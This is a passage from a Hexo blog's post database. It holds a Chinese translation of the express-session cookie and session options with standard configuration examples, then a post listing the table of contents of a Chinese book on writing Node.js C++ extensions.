title=\"选项\"></a>选项</h3><p>express-session 在options对象中接受这些属性。</p>\n<h4 id=\"cookie-为-session-ID-cookie的设置对象。默认值为\"><a href=\"#cookie-为-session-ID-cookie的设置对象。默认值为\" class=\"headerlink\" title=\"cookie 为 session ID cookie的设置对象。默认值为\"></a><code>cookie</code> 为 session ID cookie的设置对象。默认值为</h4><blockquote>\n<p>{ path: ‘/‘, httpOnly: true, secure: false, maxAge: null }。</p>\n</blockquote>\n<ul>\n<li><p>cookie.domain<br>指定Domain Set-Cookie属性的值。默认情况下，未设置任何域，并且大多数客户端会将cookie视为仅应用于当前域。</p>\n</li>\n<li><p>cookie.expires<br>指定Date要作为Expires Set-Cookie属性值的对象。默认情况下，没有设置过期，并且大多数客户端会将此视为“非持久性cookie”，并在退出Web浏览器应用程序的条件下将其删除。</p>\n<p><strong>注意</strong> 如果在选项中设置了<code>expires</code>和<code>maxAge</code>，则在对象中定义的最后一个是生效的。  </p>\n<p><strong>注意</strong> <code>expires</code>不应直接设置该选项; 而只是使用该 <code>maxAge</code> 选项。</p>\n</li>\n<li><p>cookie.httpOnly<br>指定属性的<code>boolean值``HttpOnly Set-Cookie</code>。为true时，设置HttpOnly属性，否则不设置。默认情况下，该HttpOnly 属性已设置。  </p>\n<p><strong>注意</strong> 在将其设置为true时要小心，因为兼容客户端 不允许 客户端JavaScript在<code>document.cookie</code>中看到<code>cookie</code>。</p>\n</li>\n<li><p>cookie.maxAge<br>指定计算<code>Expires Set-Cookie</code>属性时 要使用 数字(以毫秒为单位)。这是通过 获取当前服务器时间 并向<code>值</code>添加<code>maxAge</code>毫秒来计算过期日期时间来完成的。默认情况下，没有设置<code>maxAge</code>。</p>\n<p><strong>注意</strong> 如果在选项中同时设置了<code>expires</code>和<code>maxAge</code>，那么对象中定义的<code>最后一个</code>就是所使用的。</p>\n</li>\n<li><p>cookie.path<br>指定的值<code>Path</code> <code>Set-Cookie</code>。默认情况下，将其设置为<code>&#39;/&#39;</code>，即域的根路径。</p>\n</li>\n<li><p>cookie.sameSite<br>指定<code>布尔值</code>或<code>字符串</code>作为<code>SameSite Set-Cookie</code>属性的值。  </p>\n<ul>\n<li>true会将 SameSite 属性设置为严格执行相同的站点。||<br>  true将 SameSite 属性设置Strict为严格相同的站点实施。</li>\n<li>false不会设置 SameSite 属性。</li>\n<li>‘lax’将 SameSite 属性设置Lax为<code>松散</code>相同的网站实施。</li>\n<li>‘strict’将 SameSite 属性设置为<code>严格</code>Strict以便严格执行相同的站点。</li>\n</ul>\n<p><a href=\"https://tools.ietf.org/html/draft-west-first-party-cookies-07#section-4.1.1\" target=\"_blank\" rel=\"noopener\">更多关于不同执行级别的信息可以在规范中找到</a></p>\n<p><strong>注意</strong> 这是一个尚未完全标准化的属性，将来可能会改变。这也意味着许多客户可能会忽略这个属性，直到他们理解认可它。</p>\n</li>\n<li><p>cookie.secure<br>指定<code>安全</code> <code>设置cookie</code>属性的布尔值。当truthy时，设置了Secure属性，否则不设置。默认情况下，未设置Secure属性。<br>指定属性的boolean值Secure Set-Cookie。当真实时，设置Secure属性，否则不设置。默认情况下，Secure 未设置该属性。</p>\n<p><strong>注意</strong> 在设置为true时要小心，因为如果浏览器没有<code>HTTPS</code>连接，符合规范(兼容的) 客户端 将来不会将cookie发送回服务器。  </p>\n<p><strong>请注意!</strong> <code>secure: true</code>是 <strong>推荐的</strong> 选项。但是，它需要启用(支持)https的网站，即<code>secure cookies</code>需要HTTPS(HTTPS对于安全cookie是必要的)。如果<code>secure</code> 已设置，并且您通过HTTP访问您的站点，则不会设置cookie(不生效)。如果你的node.js在代理后面并且正在使用secure: true，你需要在express中设置“trust proxy”：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var app = express()</span><br><span class=\"line\"></span><br><span class=\"line\">app.set(&apos;trust proxy&apos;, 1) // trust first proxy</span><br><span class=\"line\"></span><br><span class=\"line\">app.use(session(&#123;</span><br><span class=\"line\">  secret: &apos;keyboard cat&apos;,</span><br><span class=\"line\">  resave: false,</span><br><span class=\"line\">  saveUninitialized: true,</span><br><span class=\"line\">  cookie: &#123; secure: true &#125;</span><br><span class=\"line\">&#125;))</span><br></pre></td></tr></table></figure>\n<p>对于在生产中使用 <code>secure cookies</code>，但允许在开发中进行测试，下面是一个例子，说明如何在express中基于<code>NODE_ENV</code>启用此设置:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var app = express()</span><br><span class=\"line\">var sess = &#123;</span><br><span class=\"line\">  secret: &apos;keyboard cat&apos;,</span><br><span class=\"line\">  cookie: &#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if (app.get(&apos;env&apos;) === &apos;production&apos;) &#123;</span><br><span class=\"line\">  app.set(&apos;trust proxy&apos;, 1) // trust first proxy</span><br><span class=\"line\">  sess.cookie.secure = true // serve secure cookies</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">app.use(session(sess))</span><br></pre></td></tr></table></figure>\n<p>The <code>cookie</code>。安全选项也可以设置为特殊值’auto’，使该设置自动匹配连接的确定安全性。如果站点同时作为HTTP和HTTPS可用，那么在使用此设置时要小心，因为一旦在HTTPS上设置了cookie，它将不再在HTTP上可见。当正确设置Express”trust proxy”(“信任代理”)设置以简化开发与生产配置时，这是很有用的。</p>\n</li>\n<li><p>genid 配置<br>函数调用以生成一个新的会话ID。提供一个函数，该函数返回一个将用作会话ID的字符串。<br>默认值是使用<code>uid-safe</code>库来生成id的函数。</p>\n<p><strong>注意请</strong> 注意生成惟一的id，这样会话就不会发生冲突。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.use(session(&#123;</span><br><span class=\"line\">  genid: function(req) &#123;</span><br><span class=\"line\">    return genuuid() // use UUIDs for session IDs</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  secret: &apos;keyboard cat&apos;</span><br><span class=\"line\">&#125;))</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<ul>\n<li><p>name<br>在响应中设置的会话ID cookie的名称(并从请求中读取)。<br>The default value is ‘connect.sid’.</p>\n<p><strong>注意</strong> 如果在相同的主机名上运行多个应用程序(这只是名称，即localhost或127.0.0.1;不同的方案和端口不会命名不同的主机名)，然后需要将session cookie彼此分开。最简单的方法是为每个应用设置不同的名称。</p>\n</li>\n<li><p>proxy<br>Trust the reverse proxy when setting secure cookies (via the “X-Forwarded-Proto” header).  </p>\n<p>在设置安全cookie时（通过 <code>X-Forwarded-Proto</code> 标头）信任反向代理。<br>默认值为undefined。</p>\n</li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"## \"></a>## </h2><h2 id=\"node-js-中间件express-session使用详解\"><a href=\"#node-js-中间件express-session使用详解\" class=\"headerlink\" title=\"node.js 中间件express-session使用详解\"></a><a href=\"https://www.jb51.net/article/114232.htm\" target=\"_blank\" rel=\"noopener\">node.js 中间件express-session使用详解</a></h2><h2 id=\"同源策略以及cookie安全策略\"><a href=\"#同源策略以及cookie安全策略\" class=\"headerlink\" title=\"同源策略以及cookie安全策略\"></a><a href=\"https://blog.csdn.net/turkeyzhou/article/details/8818173\" target=\"_blank\" rel=\"noopener\">同源策略以及cookie安全策略</a></h2>"},{"title":"Node-C++","date":"2018-08-02T05:46:03.000Z","_content":"## 《Node.js：来一打 C++ 扩展》\n\n### 目录\n````\n1 Node.js 的 C++ 扩展前驱知识储备 1\n1.1 Node.js 的模块机制 2\n1.1.1 CommonJS 的模块规范 2\n1.1.2 Node.js 的模块 4\n1.1.3 小结 9\n1.1.4 参考资料 9\n1.2 Node.js 的包机制 9\n1.2.1 CommonJS 的包规范 9\n1.2.2 Node.js / NPM 下的包 13\n1.2.3 NPM 与 CNPM 16\n1.2.4 小结 19\n1.2.5 参考资料 19\n1.3 Node.js 依赖简介 20\n1.3.1 Chrome V8 20\n1.3.2 libuv 25\n1.3.3 其他依赖 28\n1.3.4 小结 30\n1.3.5 参考资料 30\n1.4 C++ 扩展开发的准备工作 31\n1.4.1 编辑器 / IDE 31\n1.4.2 node-gyp 36\n1.4.3 其他构建工具 54\n1.4.4 小结 56\n1.4.5 参考资料 56\n\n2 C++ 模块原理简析 57\n2.1 为什么要写 C++ 模块 57\n2.1.1 C++ 比 JavaScript 解释器高效 57\n2.1.2 已有的 C++ 轮子 72\n2.1.3 小结 77\n2.1.4 参考资料 77\n2.2 什么是 C++ 扩展 78\n2.2.1 C++ 模块本质 78\n2.2.2 Node.js 模块加载原理 80\n2.2.3 小结 102\n2.2.4 参考资料 103\n\n3 Chrome V8 基础 104\n3.1 Node.js 与 Chrome V8 104\n3.2 基本概念 105\n3.2.1 内存机制 105\n3.2.2 隔离实例（Isolate） 108\n3.2.3 上下文（Context） 109\n3.2.4 脚本（Script） 110\n3.2.5 小结 110\n3.2.6 参考资料 111\n3.3 句柄（Handle） 111\n3.3.1 本地句柄（Local） 112\n3.3.2 持久句柄（Persistent） 115\n3.3.3 永生句柄（Eternal） 119\n3.3.4 待实本地句柄（Maybe Local） 119\n3.3.5 小结 121\n3.3.6 参考资料 121\n3.4 句柄作用域 121\n3.4.1 一般句柄作用域（Handle Scope） 122\n3.4.2 可逃句柄作用域（Escapable Handle Scope） 125\n3.4.3 小结 129\n3.4.4 参考资料 129\n3.5 上下文（Context） 129\n3.6 模板（Template） 133\n3.6.1 函数模板（Function Template） 133\n3.6.2 对象模板（Object Template） 138\n3.6.3 对象模板的访问器（Accessor）与拦截器（Interceptor） 144\n3.6.4 对象模板的内置字段（Internal Field） 175\n3.6.5 函数模板的继承（Inherit） 183\n3.6.6 小结 188\n3.6.7 参考资料 189\n3.7 常用数据类型 189\n3.7.1 基值（Value） 189\n3.7.2 字符串（String） 194\n3.7.3 数值类型 196\n3.7.4 布尔类型（Boolean） 196\n3.7.5 对象（Object） 196\n3.7.6 函数（Function） 200\n3.7.7 数组（Array） 202\n3.7.8 JSON 解析器 203\n3.7.9 函数回调信息（Function Callback Info） 203\n3.7.10 函数返回值（Return Value） 204\n3.7.11 隔离实例（Isolate） 204\n3.7.12 小结 205\n3.7.13 参考资料 206\n3.8 异常机制 206\n3.8.1 try-catch 206\n3.8.2 抛出异常 209\n3.8.3 异常生成类（Exception） 211\n3.8.4 小结 211\n3.8.5 参考资料 211\n\n4 C++ 扩展实战初探 212\n4.1 binding.gyp 212\n4.1.1 惊鸿一瞥 213\n4.1.2 binding.gyp 基础结构 213\n4.1.3 GYP 文件 214\n4.1.4 常用字段 221\n4.1.5 小结 228\n4.1.6 参考资料 228\n4.2 牛刀小试 229\n4.2.1 又是 Hello World 229\n4.2.2 函数参数 232\n4.2.3 回调函数 234\n4.2.4 函数返回 238\n4.2.5 小结 239\n4.2.6 参考资料 240\n4.3 循序渐进 240\n4.3.1 C++ 与 JavaScript 类封装 240\n4.3.2 实例化 C++ 类封装对象的函数 250\n4.3.3 将 C++ 类封装对象传来传去 253\n4.3.4 进程退出钩子 255\n4.3.5 小结 259\n4.3.6 参考资料 259\n\n5 Node.js 原生抽象——NAN 260\n5.1 Node.js 原生模块开发方式的变迁 260\n5.1.1 以不变应万变 260\n5.1.2 时代在召唤 261\n5.1.3 小结 267\n5.1.4 参考资料 267\n5.2 基础开发 267\n5.2.1 什么是 NAN 267\n5.2.2 安装和配置 269\n5.2.3 先睹为快——搭上NAN 的快车 270\n5.2.4 基础帮助函数和宏 276\n5.2.5 忽略 node_modules 279\n5.2.6 小结 279\n5.2.7 参考资料 280\n5.3 JavaScript 函数 280\n5.3.1 函数参数类型 280\n5.3.2 函数声明 282\n5.3.3 函数设置 288\n5.3.4 小结 296\n5.3.5 参考资料 296\n5.4 常用帮助类与函数 296\n5.4.1 句柄相关 296\n5.4.2 创建数据对象 298\n5.4.3 与数据对象“玩耍” 300\n5.4.4 封装一个类 314\n5.4.5 异常处理 315\n5.4.6 小结 315\n5.4.7 参考资料 316\n5.5 NAN 中的异步机制 316\n5.5.1 Nan::AsyncQueueWorker 316\n5.5.2 Nan::Callback 317\n5.5.3 Nan::AsyncWorker 317\n5.5.4 Nan::AsyncProgressWorker 323\n5.5.5 小结 327\n5.5.6 参考资料 327\n\n6 异步之旅——libuv 328\n6.1 基础概念 329\n6.1.1 事件循环 330\n6.1.2 句柄（Handle）与请求（Request） 333\n6.1.3 尝尝甜头 335\n6.1.4 小结 340\n6.1.5 参考资料 340\n6.2 libuv 的跨线程编程基础 341\n6.2.1 libuv 的线程 342\n6.2.2 同步原语（Synchronization Primitive） 347\n6.2.3 工作队列 355\n6.2.4 小结 356\n6.2.5 参考资料 357\n6.3 跨线程通信 357\n6.3.1 uv_async_t 句柄 357\n6.3.2 Watchdog 半成品实战解析 358\n6.3.3 Watchdog 试运行 367\n6.3.4 小结 368\n6.3.5 参考资料 369\n\n7 实战——文件监视器 370\n7.1 准备工作 370\n7.1.1 功能规划 370\n7.1.2 文件系统监听库——efsw 373\n7.1.3 小结 376\n7.1.4 参考资料 376\n7.2 核心设计 376\n7.2.1 API 设计 377\n7.2.2 EFSWCore 的血肉之躯 377\n7.2.3 EFSWCore 的灵魂 381\n7.2.4 小结 385\n7.3 编写JavaScript 类 386\n7.3.1 类的设计 386\n7.3.2 核心逻辑 388\n7.3.3 简单容错 391\n7.3.4 小结 393\n7.4 进一步完善 393\n7.4.1 C++ 代码的完善 393\n7.4.2 JavaScript 代码的完善 398\n7.4.3 小结 400\n\n8 实战——现有包剖析 401\n8.1 字符串哈希模块——Bling Hashes 401\n8.1.1 文件设定 402\n8.1.2 C++ 源码剖析 403\n8.1.3 JavaScript 源码剖析 408\n8.1.4 小结 409\n8.1.5 参考资料 410\n8.2 类 Proxy 包——Auto Object 410\n8.2.1 Proxy 410\n8.2.2 Auto Object 使用范例 412\n8.2.3 代码剖析 415\n8.2.4 小结 424\n8.2.5 参考资料 424\n\n9 N-API——下一代 Node.js C++ 扩展开发方式 425\n9.1 浅尝辄止 426\n9.1.1 实现一个 Echo 函数 426\n9.1.2 尝试运行 N-API 扩展 430\n9.1.3 向下兼容 431\n9.1.4 N-API Package——C++ 封装 433\n9.1.5 小结 433\n9.1.6 参考资料 433\n9.2 基本数据类型与错误处理 433\n9.2.1 基本数据类型 433\n9.2.2 与作用域及生命周期相关的数据类型 435\n9.2.3 回调数据类型 438\n9.2.4 错误处理 439\n9.2.5 模块注册 441\n9.2.6 小结 442\n9.2.7 参考资料 442\n9.3 对象与函数 442\n9.3.1 对象 442\n9.3.2 函数 448\n9.3.3 类的封装 453\n9.3.4 小结 455\n9.3.5 参考资料 455\n````\n[阅读原文](https://cnodejs.org/topic/5b223c1d5cd02be640901490)\n\n---\n\n[GYP介绍: Node.js本机插件构建工具](https://www.npmjs.com/package/node-gyp)  \n[使用技巧](https://blog.csdn.net/p13503959390/article/details/72793448)","source":"_posts/programmingLanguage/NodeJS/Node-Cpp.md","raw":"---\ntitle: Node-C++\ndate: 2018-08-02 13:46:03\ntags: Node Deep\ncategories: Node\n---\n## 《Node.js：来一打 C++ 扩展》\n\n### 目录\n````\n1 Node.js 的 C++ 扩展前驱知识储备 1\n1.1 Node.js 的模块机制 2\n1.1.1 CommonJS 的模块规范 2\n1.1.2 Node.js 的模块 4\n1.1.3 小结 9\n1.1.4 参考资料 9\n1.2 Node.js 的包机制 9\n1.2.1 CommonJS 的包规范 9\n1.2.2 Node.js / NPM 下的包 13\n1.2.3 NPM 与 CNPM 16\n1.2.4 小结 19\n1.2.5 参考资料 19\n1.3 Node.js 依赖简介 20\n1.3.1 Chrome V8 20\n1.3.2 libuv 25\n1.3.3 其他依赖 28\n1.3.4 小结 30\n1.3.5 参考资料 30\n1.4 C++ 扩展开发的准备工作 31\n1.4.1 编辑器 / IDE 31\n1.4.2 node-gyp 36\n1.4.3 其他构建工具 54\n1.4.4 小结 56\n1.4.5 参考资料 56\n\n2 C++ 模块原理简析 57\n2.1 为什么要写 C++ 模块 57\n2.1.1 C++ 比 JavaScript 解释器高效 57\n2.1.2 已有的 C++ 轮子 72\n2.1.3 小结 77\n2.1.4 参考资料 77\n2.2 什么是 C++ 扩展 78\n2.2.1 C++ 模块本质 78\n2.2.2 Node.js 模块加载原理 80\n2.2.3 小结 102\n2.2.4 参考资料 103\n\n3 Chrome V8 基础 104\n3.1 Node.js 与 Chrome V8 104\n3.2 基本概念 105\n3.2.1 内存机制 105\n3.2.2 隔离实例（Isolate） 108\n3.2.3 上下文（Context） 109\n3.2.4 脚本（Script） 110\n3.2.5 小结 110\n3.2.6 参考资料 111\n3.3 句柄（Handle） 111\n3.3.1 本地句柄（Local） 112\n3.3.2 持久句柄（Persistent） 115\n3.3.3 永生句柄（Eternal） 119\n3.3.4 待实本地句柄（Maybe Local） 119\n3.3.5 小结 121\n3.3.6 参考资料 121\n3.4 句柄作用域 121\n3.4.1 一般句柄作用域（Handle Scope） 122\n3.4.2 可逃句柄作用域（Escapable Handle Scope） 125\n3.4.3 小结 129\n3.4.4 参考资料 129\n3.5 上下文（Context） 129\n3.6 模板（Template） 133\n3.6.1 函数模板（Function Template） 133\n3.6.2 对象模板（Object Template） 138\n3.6.3 对象模板的访问器（Accessor）与拦截器（Interceptor） 144\n3.6.4 对象模板的内置字段（Internal Field） 175\n3.6.5 函数模板的继承（Inherit） 183\n3.6.6 小结 188\n3.6.7 参考资料 189\n3.7 常用数据类型 189\n3.7.1 基值（Value） 189\n3.7.2 字符串（String） 194\n3.7.3 数值类型 196\n3.7.4 布尔类型（Boolean） 196\n3.7.5 对象（Object） 196\n3.7.6 函数（Function） 200\n3.7.7 数组（Array） 202\n3.7.8 JSON 解析器 203\n3.7.9 函数回调信息（Function Callback Info） 203\n3.7.10 函数返回值（Return Value） 204\n3.7.11 隔离实例（Isolate） 204\n3.7.12 小结 205\n3.7.13 参考资料 206\n3.8 异常机制 206\n3.8.1 try-catch 206\n3.8.2 抛出异常 209\n3.8.3 异常生成类（Exception） 211\n3.8.4 小结 211\n3.8.5 参考资料 211\n\n4 C++ 扩展实战初探 212\n4.1 binding.gyp 212\n4.1.1 惊鸿一瞥 213\n4.1.2 binding.gyp 基础结构 213\n4.1.3 GYP 文件 214\n4.1.4 常用字段 221\n4.1.5 小结 228\n4.1.6 参考资料 228\n4.2 牛刀小试 229\n4.2.1 又是 Hello World 229\n4.2.2 函数参数 232\n4.2.3 回调函数 234\n4.2.4 函数返回 238\n4.2.5 小结 239\n4.2.6 参考资料 240\n4.3 循序渐进 240\n4.3.1 C++ 与 JavaScript 类封装 240\n4.3.2 实例化 C++ 类封装对象的函数 250\n4.3.3 将 C++ 类封装对象传来传去 253\n4.3.4 进程退出钩子 255\n4.3.5 小结 259\n4.3.6 参考资料 259\n\n5 Node.js 原生抽象——NAN 260\n5.1 Node.js 原生模块开发方式的变迁 260\n5.1.1 以不变应万变 260\n5.1.2 时代在召唤 261\n5.1.3 小结 267\n5.1.4 参考资料 267\n5.2 基础开发 267\n5.2.1 什么是 NAN 267\n5.2.2 安装和配置 269\n5.2.3 先睹为快——搭上NAN 的快车 270\n5.2.4 基础帮助函数和宏 276\n5.2.5 忽略 node_modules 279\n5.2.6 小结 279\n5.2.7 参考资料 280\n5.3 JavaScript 函数 280\n5.3.1 函数参数类型 280\n5.3.2 函数声明 282\n5.3.3 函数设置 288\n5.3.4 小结 296\n5.3.5 参考资料 296\n5.4 常用帮助类与函数 296\n5.4.1 句柄相关 296\n5.4.2 创建数据对象 298\n5.4.3 与数据对象“玩耍” 300\n5.4.4 封装一个类 314\n5.4.5 异常处理 315\n5.4.6 小结 315\n5.4.7 参考资料 316\n5.5 NAN 中的异步机制 316\n5.5.1 Nan::AsyncQueueWorker 316\n5.5.2 Nan::Callback 317\n5.5.3 Nan::AsyncWorker 317\n5.5.4 Nan::AsyncProgressWorker 323\n5.5.5 小结 327\n5.5.6 参考资料 327\n\n6 异步之旅——libuv 328\n6.1 基础概念 329\n6.1.1 事件循环 330\n6.1.2 句柄（Handle）与请求（Request） 333\n6.1.3 尝尝甜头 335\n6.1.4 小结 340\n6.1.5 参考资料 340\n6.2 libuv 的跨线程编程基础 341\n6.2.1 libuv 的线程 342\n6.2.2 同步原语（Synchronization Primitive） 347\n6.2.3 工作队列 355\n6.2.4 小结 356\n6.2.5 参考资料 357\n6.3 跨线程通信 357\n6.3.1 uv_async_t 句柄 357\n6.3.2 Watchdog 半成品实战解析 358\n6.3.3 Watchdog 试运行 367\n6.3.4 小结 368\n6.3.5 参考资料 369\n\n7 实战——文件监视器 370\n7.1 准备工作 370\n7.1.1 功能规划 370\n7.1.2 文件系统监听库——efsw 373\n7.1.3 小结 376\n7.1.4 参考资料 376\n7.2 核心设计 376\n7.2.1 API 设计 377\n7.2.2 EFSWCore 的血肉之躯 377\n7.2.3 EFSWCore 的灵魂 381\n7.2.4 小结 385\n7.3 编写JavaScript 类 386\n7.3.1 类的设计 386\n7.3.2 核心逻辑 388\n7.3.3 简单容错 391\n7.3.4 小结 393\n7.4 进一步完善 393\n7.4.1 C++ 代码的完善 393\n7.4.2 JavaScript 代码的完善 398\n7.4.3 小结 400\n\n8 实战——现有包剖析 401\n8.1 字符串哈希模块——Bling Hashes 401\n8.1.1 文件设定 402\n8.1.2 C++ 源码剖析 403\n8.1.3 JavaScript 源码剖析 408\n8.1.4 小结 409\n8.1.5 参考资料 410\n8.2 类 Proxy 包——Auto Object 410\n8.2.1 Proxy 410\n8.2.2 Auto Object 使用范例 412\n8.2.3 代码剖析 415\n8.2.4 小结 424\n8.2.5 参考资料 424\n\n9 N-API——下一代 Node.js C++ 扩展开发方式 425\n9.1 浅尝辄止 426\n9.1.1 实现一个 Echo 函数 426\n9.1.2 尝试运行 N-API 扩展 430\n9.1.3 向下兼容 431\n9.1.4 N-API Package——C++ 封装 433\n9.1.5 小结 433\n9.1.6 参考资料 433\n9.2 基本数据类型与错误处理 433\n9.2.1 基本数据类型 433\n9.2.2 与作用域及生命周期相关的数据类型 435\n9.2.3 回调数据类型 438\n9.2.4 错误处理 439\n9.2.5 模块注册 441\n9.2.6 小结 442\n9.2.7 参考资料 442\n9.3 对象与函数 442\n9.3.1 对象 442\n9.3.2 函数 448\n9.3.3 类的封装 453\n9.3.4 小结 455\n9.3.5 参考资料 455\n````\n[阅读原文](https://cnodejs.org/topic/5b223c1d5cd02be640901490)\n\n---\n\n[GYP介绍: Node.js本机插件构建工具](https://www.npmjs.com/package/node-gyp)  \n[使用技巧](https://blog.csdn.net/p13503959390/article/details/72793448)","slug":"programmingLanguage/NodeJS/Node-Cpp","published":1,"updated":"2018-09-05T06:33:18.494Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry0k00b6zodv8tx70kst","content":"<h2 id=\"《Node-js：来一打-C-扩展》\"><a href=\"#《Node-js：来一打-C-扩展》\" class=\"headerlink\" title=\"《Node.js：来一打 C++ 扩展》\"></a>《Node.js：来一打 C++ 扩展》</h2><h3 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span 